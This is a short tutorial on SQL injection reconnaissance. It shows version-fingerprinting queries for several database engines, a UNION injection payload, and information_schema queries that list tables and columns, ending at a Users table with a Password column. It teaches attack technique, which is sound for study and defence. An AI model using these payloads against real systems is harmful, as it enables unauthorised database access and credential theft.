## Examining a Database for SQL Injection Attacks
To exploit SQL injection vulnerabilities, it is often necessary to find information about the database. This includes:
- The type and version of the database software.
- The tables and columns that the database contains.
## Querying the Database Type and Version
You can potentially determine both the database type and its version by injecting provider-specific queries to see which one works.
Here are the queries to determine the database version for some popular database types:
#### Oracle
```SQL
SELECT banner FROM v$version
```
or
```SQL
SELECT version FROM v$instance
```
#### Microsoft, MySQL
```SQL
SELECT @@version
```
#### PostgreSQL
```SQL
SELECT version()
```

For example, you can use the `UNION` attack with the following input:
```SQL
' UNION SELECT @@version--
```
This might return the following result. In this case, you can confirm that the database is Microsoft SQL Server, and also see the version being used:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
## Listing the contents of a database
Most types of databases (except Oracle) have a set of views called the `information schema`. This provides information about the database.

For example, you can query `information_schema.tables` to get a list of tables in the database:
```SQL
SELECT * FROM information_schema.tables
```
This will return output similar to the following:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
=========================================================
MyDatabase dbo Products BASE TABLE
MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE
```
This output indicates that there are three tables in the database: `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to get a list of columns in individual tables:
```SQL
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
This will return output similar to the following:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
===========================================================================
MyDatabase dbo Users UserId int
MyDatabase dbo Users Username varchar
MyDatabase dbo Users Password varchar
```
This output shows the columns in the specified table and the data type of each column.